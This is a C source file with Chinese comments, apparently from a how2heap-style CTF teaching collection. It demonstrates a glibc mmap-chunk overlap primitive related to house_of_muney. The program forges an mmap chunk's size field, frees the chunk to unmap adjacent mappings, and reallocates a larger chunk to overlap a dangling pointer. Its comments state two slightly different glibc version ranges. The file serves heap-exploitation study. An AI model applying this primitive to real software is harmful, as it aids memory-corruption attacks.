/*
 * 中文导读（CTF 版）：本文件演示 house_of_muney 手法，标注的适用范围是
 * glibc 2.23～2.42。它先覆盖一个 mmap chunk 的 size，同时保留 IS_MMAPPED
 * 位来模拟漏洞。核心流程是把这个 mmap chunk 的长度扩大到覆盖相邻映射，
 * free 触发 munmap 之后再重新 mmap，从而拿到一段重叠区域。成功的判据是
 * 从新旧两个指针都能观察到同一块内存。这个 PoC 只展示 mmap overlap 这个
 * 原语本身；如果要完整地"偷到" libc 的映射，还要看实际映射是否相邻。
 *
 * 阅读约定：malloc 返回的是用户可写的数据区，源码里通常 p[-1] 是 size
 * 字段，p[-2] 是 prev_size 字段。文件里所有故意构造的 UAF、越界和
 * double free 都只是在模拟漏洞，不是正常的 C 语言用法。具体的版本范围
 * 以本目录 README 和验证矩阵为准；如果目标发行版对补丁做了回移，还是
 * 要按实际 libc 源码重新判断。
 */

#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <unistd.h>

/*
 * 这个思路依赖的是 mmap/munmap 和 IS_MMAPPED 这个元数据位，而不是常规
 * bin 的细节，所以在本项目覆盖的 glibc 2.23~2.43 里都保留了各自独立的
 * PoC。编译示例：
 * 编译命令：gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g
 * 原始 PoC 作者：Maxwell Dulin（Strikeout）。
 */
int main()
{
	/*
	 * mmap chunk 的基础知识
	 * ==================
	 * 一次请求如果超过动态的 mmap_threshold，glibc 就不会再从 brk 堆里
	 * 切块，而是直接 mmap 一段独立的虚拟内存。free 看到 size 里的
	 * IS_MMAPPED 位之后，也不会把这块内存放回 fast/small/large bin，而是
	 * 根据 chunk header 里记录的地址和长度调用 munmap，把整段映射直接
	 * 归还给内核。
	 *
	 * mmap chunk 依然有 prev_size 和 size 这两个字段，但语义变了：size
	 * 给出的是这段映射的长度，并带着 IS_MMAPPED 标志；prev_size 记录的是
	 * 因为页对齐产生的前导偏移量，而不是普通堆里"左边相邻空闲块的大小"
	 * 这个含义。它也不会用到 fd/bk 这两个字段。munmap 的起点和总长度都
	 * 必须满足页对齐的约束，所以伪造 size 时既要能覆盖到相邻映射，又要
	 * 保持 IS_MMAPPED 标志和正确的对齐。
	 *
	 * 本例是 mmap 版本的 overlapping chunks：先把第三块的 size 扩大，让
	 * 一次 free 同时解除第二块和第三块的映射；再申请一块更大的 mmap
	 * chunk，促使内核复用刚才释放出来的地址区间，这样新指针就会和旧的
	 * mmap_chunk_2 指向同一片物理页面。和普通堆上的重叠不一样，munmap
	 * 之后旧指针会立刻变得不可访问，必须等它被重新映射之后才能读写。
	 * 同类原语还可能解除 libc、堆或者其他相邻映射，具体能不能完整利用，
	 * 取决于实际的映射顺序。
	 *
	 * 普通堆重叠可以对照看：
	 * https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c
	 * mmap chunk 的延伸资料：
	 * http://tukan.farm/2016/07/27/munmap-madness/
	 */

	malloc(0x10);      // 先创建 brk 堆。
	malloc(0x100000);  // 再把后续大块推到 mmap 路径。

	// 在这个示例的 Linux 布局里，后续的匿名 mmap 通常是从高地址往低地址放置，逐渐靠近 brk 堆。
	long long* mmap_chunk_2 = malloc(0x100000);

	long long* mmap_chunk_3 = malloc(0x100000);

	// 漏洞模拟：这里假设有负索引越界写、下方映射越界写等原语，把第三块的 size 扩大；
	// 如果布局允许，也可以改 prev_size 来挪动 munmap 的起点，思路是一样的。
	mmap_chunk_3[-1] = ((0xFFFFFFFFFD & mmap_chunk_3[-1]) +
	                    (0xFFFFFFFFFD & mmap_chunk_2[-1])) | 2;

	/*
	 * free 看到 IS_MMAPPED 之后会走进 munmap_chunk；旧版本源码可以参考：
	 * https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845
	 * 普通堆上的 free 之后，页面依然映射在进程里，所以 UAF 往往可以立刻
	 * 读写；munmap 则是直接撤销页表映射，任何提前访问旧指针的操作都会
	 * 直接 SIGSEGV。所以这里的利用目标，不是在已经解除映射的悬空指针上
	 * 直接写，而是先让后续的 mmap 重新占据同一块地址，再让两个逻辑对象
	 * 指向同一片已经映射好的内存，形成重叠关系。
	 */
	// 伪造的 size 覆盖了两个相邻映射，所以这一次 free 会同时解除第二块和第三块的地址区间。
	free(mmap_chunk_3);

	/*
	 * 这时如果执行 mmap_chunk_2[0] = 0xdeadbeef 会直接崩溃，因为对应的
	 * 虚拟地址已经不属于这个进程了；必须等下面这次大请求把这段地址重新
	 * mmap 回来，才能再去访问旧指针。
	 */

	/*
	 * 释放掉这个大的 mmap chunk 之后，glibc 会动态提高 mmap_threshold，
	 * 本例大概会升到 0x202000。所以新的请求必须再大一点，才能保证还是走
	 * mmap 而不是被打回 brk 堆；这里请求 0x300000，期望内核会复用刚刚
	 * 解除的这段连续地址范围。
	 */
	long long* overlapping_chunk = malloc(0x300000);

	// 计算新映射的起点到旧的第二块用户指针之间，相差多少个 long long 元素。
	int distance = mmap_chunk_2 - overlapping_chunk;

	// 通过新映射加上这个距离去写入，实际写到的地址正好就是那个悬空的 mmap_chunk_2。
	overlapping_chunk[distance] = 0x1122334455667788;

	// 同时从新旧两个表达式读取并断言相等，证明这确实是重叠而不只是地址凑巧接近。

	assert(mmap_chunk_2[0] == overlapping_chunk[distance]);

	_exit(0); // 直接退出，避免相邻的系统映射受到影响时，再走进复杂的 libc 清理路径。
}
